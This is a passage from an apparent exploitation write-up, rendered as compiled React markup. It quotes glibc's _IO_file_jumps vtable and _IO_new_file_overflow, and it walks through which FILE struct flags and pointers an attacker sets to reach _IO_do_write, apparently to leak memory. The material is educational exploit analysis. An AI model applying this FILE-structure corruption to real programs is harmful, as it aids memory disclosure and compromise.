operator\",children:\"\u0026\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_JUMPS_FILE_plus\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t\t     \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_vtable_offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"// And now we have the symbol we care about, _IO_file_overflow\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/fileops.c#L1426\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"const\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_jump_t\"}),\" _IO_file_jumps libio_vtable \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  JUMP_INIT_DUMMY\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP_INIT\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"finish\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_finish\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP_INIT\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP_INIT\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"underflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_underflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Macro chasing in glibc is usually a nightmare. Let\\u2019s look at \",(0,n.jsx)(e.code,{children:\"_IO_file_overflow\"}),\" now:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/fileops.c#L730\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_new_file_overflow\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FILE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" _IO_NO_WRITES\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* SET ERROR */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|=\"}),\" _IO_ERR_SEEN\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__set_errno\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"EBADF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* If currently reading or no buffer allocated. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" _IO_CURRENTLY_PUTTING\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"NULL\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Allocate a buffer if needed. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"NULL\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_doallocbuf\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_setg\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token comment\",children:`/* Otherwise must be currently reading.\n`})]}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t logically slide the buffer forwards one block (by setting the\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t read pointers to all point at the beginning of the block).  This\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t makes room for subsequent output.\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t Otherwise, set the read pointers to _IO_read_end (leaving that\n`})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"\t alone, so it can continue to correspond to the external position). */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__glibc_unlikely\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_in_backup\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" nbackup \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_free_backup_area\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"MIN\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"nbackup\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\t   f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|=\"}),\" _IO_CURRENTLY_PUTTING\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\u0026\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_IO_LINE_BUF \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|\"}),\" _IO_UNBUFFERED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ch \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_write\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_buf_end \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Buffer is really full */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_flush\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" _IO_UNBUFFERED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\" _IO_LINE_BUF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\u0026\"}),\" ch \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token char\",children:\"'\\\\n'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_write\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"libc_hidden_ver\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_IO_new_file_overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ok! We have some interesting things to manipulate here. The most important thing is we want to reach an \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\" call. This will actually write whats in our buffer to the file descriptor. We obviously can\\u2019t let \",(0,n.jsx)(e.code,{children:\"ch\"}),\" be \",(0,n.jsx)(e.code,{children:\"EOF\"}),\", but our program does print newlines all the time! So how do we reach the second call of \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\"?\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"_IO_NO_WRITES\"}),\" should be false, this prevents the error\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"_IO_CURRENTLY_PUTTING\"}),\" should be true, this skips over unneeded write buffering\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"_IO_write_ptr == _IO_write_end\"}),\", which will call \",(0,n.jsx)(e.code,{children:\"_IO_do_flush\"})]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Alright, before we can confirm that we hit the newline \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\", we need to look at 